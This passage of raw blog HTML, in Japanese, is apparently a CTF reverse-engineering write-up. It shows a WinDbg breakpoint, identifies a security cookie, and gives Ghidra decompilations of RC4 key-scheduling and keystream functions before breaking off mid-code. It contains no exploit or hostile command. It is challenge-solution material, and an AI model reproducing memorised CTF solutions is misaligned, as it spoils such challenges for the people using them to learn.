    style=&quot;padding-bottom: 30.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABMUlEQVQY03WQS0/DMBCE8/9/A4LfwAkEVwQXXhII1KK0PFLlAUnjOHacuPbHkh64wEqjtdba2ZlJjDF0Xc84IhXn3nUTdvCkT7eUZYEbd6jeY10j/xmDK3FO470nxkDYTYQwyTuSVGVFtslp6oi1zNXUht547i/PeHt9lWWH1YpaX9OYU7S7R2tLqxqmUcmRH2ghhMR2BrXtZsKq3BNaMzL5yM3FOet1iogkXRo+PrQoLqm/ViiVUudb2kJhqi26ajC6JcnUhrc6I8sDjYr4IApbR+/g9uSI5eIZ3UFR7MRBZBAXTnIJwUuPs/pp6gVaYEge8ifu3h/JykD+KQseNkVPowM3J4e8LBZ72ZLvL/6vZLSjSB1QbRTb+6EbJGTZuzo+YL1K51kIYQ79J6d9/xvfBknLlkXLvGgAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e89668a93e15c3df0bca083fd4cb0504/8ac56/image-3.webp 240w,
/static/e89668a93e15c3df0bca083fd4cb0504/d3be9/image-3.webp 480w,
/static/e89668a93e15c3df0bca083fd4cb0504/d2334/image-3.webp 659w&quot;
              sizes=&quot;(max-width: 659px) 100vw, 659px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e89668a93e15c3df0bca083fd4cb0504/8ff5a/image-3.png 240w,
/static/e89668a93e15c3df0bca083fd4cb0504/e85cb/image-3.png 480w,
/static/e89668a93e15c3df0bca083fd4cb0504/6db71/image-3.png 659w&quot;
            sizes=&quot;(max-width: 659px) 100vw, 659px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e89668a93e15c3df0bca083fd4cb0504/6db71/image-3.png&quot;
            alt=&quot;image-3.png&quot;
            title=&quot;image-3.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; bu 0086734e&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;WinDbgで読ませたところ、Ghidra上で&lt;code class=&quot;language-text&quot;&gt;DAT_00471090&lt;/code&gt;として表示されていたデータはどうやらSecurity Cookieだということがわかりました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 696px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4e960040ed4a62ea1a54c6669515e475/82158/image-4.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 27.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABPElEQVQY04XRbUvCUBTA8X3/j1AUYWHltLASil7kG4mKMFHTabqlrjltbUuHe9D9u16DehF04Me953C4XM5RtFaLZqPBwDB4M0cs44TZ55I4DAnmM2Sk6Q/+OKVNKLWWxsvQZDiZMnZdnHnCwE7xw4i+aaG/WyxEYyxE337f10JhkW4o6vEVhdw1mW2V/S2VYr5MsXDDxUlZ1vO5S/L7JVThaO+MXOacQlbUDkqSKvL1ebh7SnangFKv3NK4vaPz8IjZfMZqddGfDGytQ1vU9Fqd5n2FbrXKuN3B6em4uoFrvOJJA8l/HUpKt99jZI358H05iXgJ40lKGMc4nscsCJiFAUEUsogj/gtF09qMTBPrzWIulhCFS0xzvZAA27bxxKOemO2H4zCdTERPgCtyX3wgSRKxl5R0tRJS6QtcBbjfUN/CDwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4e960040ed4a62ea1a54c6669515e475/8ac56/image-4.webp 240w,
/static/4e960040ed4a62ea1a54c6669515e475/d3be9/image-4.webp 480w,
/static/4e960040ed4a62ea1a54c6669515e475/038cb/image-4.webp 696w&quot;
              sizes=&quot;(max-width: 696px) 100vw, 696px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4e960040ed4a62ea1a54c6669515e475/8ff5a/image-4.png 240w,
/static/4e960040ed4a62ea1a54c6669515e475/e85cb/image-4.png 480w,
/static/4e960040ed4a62ea1a54c6669515e475/82158/image-4.png 696w&quot;
            sizes=&quot;(max-width: 696px) 100vw, 696px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4e960040ed4a62ea1a54c6669515e475/82158/image-4.png&quot;
            alt=&quot;image-4.png&quot;
            title=&quot;image-4.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;__security_cookie&lt;/code&gt;はデータセクション内に定義され、バッファオーバーフローの検出に利用されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://reverseengineering.stackexchange.com/questions/22182/security-cookie-for-function-pointers-in-windows-10&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ida - _&lt;em&gt;security&lt;/em&gt;cookie for function pointers in Windows 10&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;どうやらこの用途のわからなかった2行は、この機構によってバッファオーバーフローの発生を検知するための処理のようですね。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;uVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; DAT_00471090 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;/* 中略 */&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;thunk_FUN_00407648&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uVar1 &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;stack0xfffffffc&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;extraout_DL&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;S&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ちょっとすっきりしたので、このままKSAとPRGAの解析を進めていきます。&lt;/p&gt;
&lt;h3 id=&quot;ksaのデコンパイル&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ksa%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB&quot; aria-label=&quot;ksaのデコンパイル permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;KSAのデコンパイル&lt;/h3&gt;
&lt;p&gt;KSA関数をGhidra でデコンパイルした結果はこんな感じでした。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;undefined4 __cdecl &lt;span class=&quot;token function&quot;&gt;KSA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; param_2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; sVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint local_10&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_8&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_2 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  sVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;_strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_8 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_8 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_2 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_10 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;param_1&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;sVar1&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;
               &lt;span class=&quot;token number&quot;&gt;0x800000ff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_10 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_10 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffff00&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;thunk_FUN_00867180&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_2 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_2 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_10&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://harekaze.com/ctf/2021.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Harekaze mini CTF 2021&lt;/a&gt;のRev問で出てきたバイナリのデコンパイル結果とよく似ていますね。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/1e41c17bd1239ee2d989d8b1800cf4d1/0b533/image-5.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 68.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAABk0lEQVQ4y41Ti3LbMAzz///TPmJfse3axbEelChSwiC7brurL6nueEwiCQEIaInhB3L5CZGBlAZCGIiRlQ2aG1poqNWhm8KqYa4xxl5Xa9FWYFbhbugdrPFe46zx0Z8C3rZORjeUcvt06PrwCfZoLVmckla0lr9cvKqnDN0zVBUxddRkMGmU2y9AD+ZPGRZZacgdqcxZOqwZru8MPME6AANd3EJCSXdIEqQaCTrBDYXunoZ9ZvhoHEvvyouCSoaaE2epBFB079DW+XmOwL7FboIuKWZK3ng5wwfzRrDR8cXtR8z+Y1iKETBASsCvdcXL/S/qnTLV4CaUz0CzuxVIbRAGvCUlgQSlMikz+HFXtgNOZJG5sSHXV5qzwinRekOeCeBITte/JVnV+dwqw92QoiHnsj+7KOyBzBNnq0IG808Nac9t21nOp2he0LRw1n4AzqiIVBrTdmMqpTI5hwnO6ucsncxBgGNv2Hgbced3/4jNn98BL68rQgxkGdnj0UPExr6FowKjNX8798J55m1vP7cF/ANCGU4Yr1jrVQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/1e41c17bd1239ee2d989d8b1800cf4d1/8ac56/image-5.webp 240w,
/static/1e41c17bd1239ee2d989d8b1800cf4d1/d3be9/image-5.webp 480w,
/static/1e41c17bd1239ee2d989d8b1800cf4d1/b0a15/image-5.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/1e41c17bd1239ee2d989d8b1800cf4d1/8ff5a/image-5.png 240w,
/static/1e41c17bd1239ee2d989d8b1800cf4d1/e85cb/image-5.png 480w,
/static/1e41c17bd1239ee2d989d8b1800cf4d1/0b533/image-5.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/1e41c17bd1239ee2d989d8b1800cf4d1/0b533/image-5.png&quot;
            alt=&quot;image-5.png&quot;
            title=&quot;image-5.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/TeamHarekaze/harekaze-mini-ctf-2021-challenges-public/blob/main/rev/pack-program/solution/Pack%20Program-solve.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;harekaze-mini-ctf-2021 Pack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;これがすぐに見抜けてれば解けたと思うと悔しいです。&lt;/p&gt;
&lt;h3 id=&quot;prgaのデコンパイル&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#prga%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB&quot; aria-label=&quot;prgaのデコンパイル permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;PRGAのデコンパイル&lt;/h3&gt;
&lt;p&gt;以下がデコンパイル結果です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;undefined4 __cdecl &lt;span class=&quot;token function&quot;&gt;PRGA&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; param_1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;param_2&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; param_3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; sVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint local_10&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint local_c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint local_8&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  sVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;_strlen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; sVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_8 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x800000ff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffff00&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_10 &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x800000ff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
